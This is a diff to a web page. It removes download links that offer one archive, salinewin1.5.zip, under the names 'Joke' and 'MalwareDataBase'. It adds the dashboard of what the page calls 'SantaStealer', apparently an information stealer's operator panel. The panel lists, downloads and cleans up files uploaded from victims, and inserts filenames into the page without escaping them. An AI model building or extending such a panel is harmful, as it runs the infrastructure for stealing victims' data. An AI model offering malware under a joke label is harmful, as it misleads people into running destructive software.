@@ -1,47 +1,278 @@
-<div style="
-    background: rgba(255, 255, 255, 0.05);
-    backdrop-filter: blur(10px);
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    padding: 30px;
-    border-radius: 16px;
-    width: 350px;
-    text-align: center;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-    font-family: 'Segoe UI', sans-serif;
-    color: white;
-    z-index: 10;
-    position: relative;
-    margin: 20px auto;
-">
-    <h2 style="margin-bottom: 25px; font-weight: 600; letter-spacing: 0.5px;">ВЫБЕРИТЕ ФАЙЛ</h2>
-
-    <div style="margin-bottom: 20px;">
-        <p style="margin: 0 0 8px 0; font-size: 14px; color: #aaa; text-align: left;">Раздел: Шутки / Приколы</p>
-        <a href="salinewin1.5.zip" download="Joke.zip" style="
-            display: block;
-            padding: 12px;
-            background: linear-gradient(135deg, #ff4757, #ff6b81);
-            color: white;
-            text-decoration: none;
-            border-radius: 8px;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SantaStealer | Unix</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="icon" href="/static/Santa.png">
+    <style>
+        .convert-btn {
+            width: 120px;
+            height: 40px;
+            border: none;
+            border-radius: 10px;
+            background: linear-gradient(to right, #770a0a, #ff7777, #770a0a, #770a0a, #ff7777, #770a0a);
+            background-size: 250%;
+            background-position: left;
+            color: #ff7777;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition-duration: 1s;
+            overflow: hidden;
             font-weight: bold;
-            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.3);
-            transition: 0.2s;
-        ">Скачать Joke (.ZIP)</a>
+        }
+
+        .convert-btn::before {
+            position: absolute;
+            content: attr(data-text);
+            color: #ff7777;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 97%;
+            height: 90%;
+            border-radius: 8px;
+            transition-duration: 1s;
+            background-color: rgba(0, 0, 0, 0.842);
+            background-size: 200%;
+        }
+
+        .convert-btn:hover {
+            background-position: right;
+            transition-duration: 1s;
+        }
+
+        .convert-btn:hover::before {
+            background-position: right;
+            transition-duration: 1s;
+        }
+
+        .convert-btn:active {
+            transform: scale(0.95);
+        }
+    </style>
+</head>
+<body>
+    <div id="root">
+        <div class="min-h-screen relative overflow-hidden" style="background-color: rgb(5, 1, 1);">
+            <div class="relative z-10 min-h-screen flex flex-col">
+                <!-- Navigation -->
+                <nav class="w-full">
+                    <div class="w-full bg-red-black-60 backdrop-blur-xl border-b border-gray-800/50">
+                        <div class="w-full px-6 py-3 flex items-center justify-between">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-10 h-10 rounded-xl flex items-center justify-center">
+                                    <img src="/static/Santa.png" alt="Santa" class="w-8 h-8 object-contain">
+                                </div>
+                                <span class="text-xl font-bold text-white">Santa Stealer</span>
+                            </div>
+                            <div class="hidden md:block">
+                                <div class="flex items-center space-x-2">
+                                    <span class="text-gray-500">|</span>
+                                    <button class="px-4 py-2 rounded-xl transition-all duration-300 font-medium text-white bg-red-dark-50">
+                                        Dashboard
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </nav>
+
+                <!-- Main Content -->
+                <main class="flex-1 flex flex-col">
+                    <div class="flex-1 flex flex-col px-4">
+                        <div class="max-w-[95%] mx-auto w-full flex-1 flex flex-col">
+                            <div class="flex-1 flex">
+                                <div class="flex-1 w-full px-4 py-6">
+                                    <!-- Stats Cards -->
+                                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
+                                        <div class="bg-red-black-40 backdrop-blur-xl border border-gray-800/50 rounded-2xl p-6">
+                                            <div class="text-gray-400 text-sm mb-2">Total Files</div>
+                                            <div class="text-3xl font-bold text-white" id="total-files">0</div>
+                                        </div>
+                                        <div class="bg-red-black-40 backdrop-blur-xl border border-gray-800/50 rounded-2xl p-6">
+                                            <div class="text-gray-400 text-sm mb-2">Merged Archives</div>
+                                            <div class="text-3xl font-bold text-red" id="merged-files">0</div>
+                                        </div>
+                                        <div class="bg-red-black-40 backdrop-blur-xl border border-gray-800/50 rounded-2xl p-6">
+                                            <div class="text-gray-400 text-sm mb-2">Active Uploads</div>
+                                            <div class="text-3xl font-bold text-red" id="active-uploads">0</div>
+                                        </div>
+                                        <div class="bg-red-black-40 backdrop-blur-xl border border-gray-800/50 rounded-2xl p-6">
+                                            <div class="text-gray-400 text-sm mb-2">Total Size</div>
+                                            <div class="text-3xl font-bold text-white" id="total-size">0 MB</div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Actions -->
+                                    <div class="flex justify-between items-center mb-6">
+                                        <h2 class="text-2xl font-bold text-white">Uploaded Files</h2>
+                                        <div class="flex gap-3">
+                                            <button class="convert-btn" data-text="Refresh" onclick="refreshData()">
+                                            </button>
+                                            <button class="convert-btn" data-text="Cleanup" onclick="cleanupChunks()">
+                                            </button>
+                                        </div>
+                                    </div>
+
+                                    <!-- Files Table -->
+                                    <div class="bg-red-black-40 backdrop-blur-xl border border-gray-800/50 rounded-2xl p-6">
+                                        <div class="overflow-x-auto">
+                                            <table class="w-full" id="files-table">
+                                                <thead>
+                                                    <tr class="text-gray-400 text-sm border-b border-gray-800/50">
+                                                        <th class="text-left py-3 px-4">Filename</th>
+                                                        <th class="text-left py-3 px-4">Type</th>
+                                                        <th class="text-left py-3 px-4">Size</th>
+                                                        <th class="text-left py-3 px-4">Modified</th>
+                                                        <th class="text-center py-3 px-4">Actions</th>
+                                                    </tr>
+                                                </thead>
+                                                <tbody id="files-tbody" class="text-white">
+                                                    <!-- Files will be loaded here -->
+                                                </tbody>
+                                            </table>
+                                        </div>
+                                    </div>
+
+                                    <!-- Active Chunks -->
+                                    <div class="bg-red-black-40 backdrop-blur-xl border border-gray-800/50 rounded-2xl p-6 mt-6">
+                                        <h3 class="text-xl font-bold text-white mb-4">Active Multi-Part Uploads</h3>
+                                        <div id="chunks-content" class="text-gray-400">
+                                            Loading...
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+            </div>
+        </div>
     </div>
 
-    <div>
-        <p style="margin: 0 0 8px 0; font-size: 14px; color: #aaa; text-align: left;">Раздел: База данных</p>
-        <a href="salinewin1.5.zip" download="MalwareDataBase.zip" style="
-            display: block;
-            padding: 12px;
-            background: linear-gradient(135deg, #00ced1, #00bfff);
-            color: white;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: bold;
-            box-shadow: 0 4px 15px rgba(0, 206, 209, 0.3);
-            transition: 0.2s;
-        ">Скачать MalwareDataBase (.ZIP)</a>
-    </div>
-</div>
+    <script>
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 B';
+            const k = 1024;
+            const sizes = ['B', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
+        }
+
+        function formatDate(dateString) {
+            const date = new Date(dateString);
+            return date.toLocaleString();
+        }
+
+        async function loadFiles() {
+            try {
+                const response = await fetch('/files');
+                const data = await response.json();
+                
+                document.getElementById('total-files').textContent = data.count;
+                const mergedCount = data.files.filter(f => f.type === 'merged').length;
+                document.getElementById('merged-files').textContent = mergedCount;
+                const totalSize = data.files.reduce((sum, f) => sum + f.size, 0);
+                document.getElementById('total-size').textContent = formatBytes(totalSize);
+                
+                const tbody = document.getElementById('files-tbody');
+                tbody.innerHTML = '';
+                
+                if (data.files.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="5" class="text-center py-8 text-gray-500">No files uploaded yet</td></tr>';
+                    return;
+                }
+                
+                data.files.forEach(file => {
+                    const row = document.createElement('tr');
+                    row.className = 'border-b border-gray-800/30 hover:bg-red-black-20 transition-colors';
+                    
+                    const typeColor = file.type === 'merged' ? 'text-green-400' : 'text-blue-400';
+                    const typeBadge = file.type === 'merged' ? '📦 Merged' : '📄 Single';
+                    
+                    row.innerHTML = `
+                        <td class="py-4 px-4 font-mono text-sm">${file.name}</td>
+                        <td class="py-4 px-4"><span class="${typeColor}">${typeBadge}</span></td>
+                        <td class="py-4 px-4">${formatBytes(file.size)}</td>
+                        <td class="py-4 px-4 text-gray-400 text-sm">${formatDate(file.modified)}</td>
+                        <td class="py-4 px-4 text-center">
+                            <button class="convert-btn" style="width: 100px; margin: 0 auto;" data-text="Download" 
+                                    onclick="downloadFile('${file.name}', '${file.type}')">
+                            </button>
+                        </td>
+                    `;
+                    tbody.appendChild(row);
+                });
+            } catch (error) {
+                console.error('Error loading files:', error);
+            }
+        }
+
+        async function loadChunks() {
+            try {
+                const response = await fetch('/chunks');
+                const data = await response.json();
+                
+                document.getElementById('active-uploads').textContent = Object.keys(data.active_uploads).length;
+                
+                const chunksDiv = document.getElementById('chunks-content');
+                
+                if (Object.keys(data.active_uploads).length === 0) {
+                    chunksDiv.innerHTML = '<p class="text-gray-500">No active uploads</p>';
+                    return;
+                }
+                
+                let html = '<div class="space-y-3">';
+                for (const [filename, info] of Object.entries(data.active_uploads)) {
+                    html += `
+                        <div class="bg-red-black-20 rounded-xl p-4 border border-gray-800/30">
+                            <div class="font-bold text-white mb-2">${filename}</div>
+                            <div class="text-gray-400 text-sm">
+                                Parts: ${info.parts_count} | Total: ${formatBytes(info.total_size)}
+                            </div>
+                            <div class="font-mono text-xs text-red mt-2">
+                                ${info.parts.join(', ')}
+                            </div>
+                        </div>
+                    `;
+                }
+                html += '</div>';
+                chunksDiv.innerHTML = html;
+            } catch (error) {
+                console.error('Error loading chunks:', error);
+            }
+        }
+
+        function downloadFile(filename, type) {
+            const path = type === 'merged' ? 'merged' : '';
+            window.location.href = `/download/${path}/${filename}`.replace('//', '/');
+        }
+
+        async function cleanupChunks() {
+            if (!confirm('Delete all temporary chunks?')) return;
+            
+            try {
+                const response = await fetch('/cleanup', { method: 'DELETE' });
+                const data = await response.json();
+                alert(`Deleted ${data.deleted_files} files (${formatBytes(data.deleted_size_bytes)})`);
+                refreshData();
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
+        }
+
+        function refreshData() {
+            loadFiles();
+            loadChunks();
+        }
+
+        setInterval(refreshData, 5000);
+        refreshData();
+    </script>
+</body>
+</html>
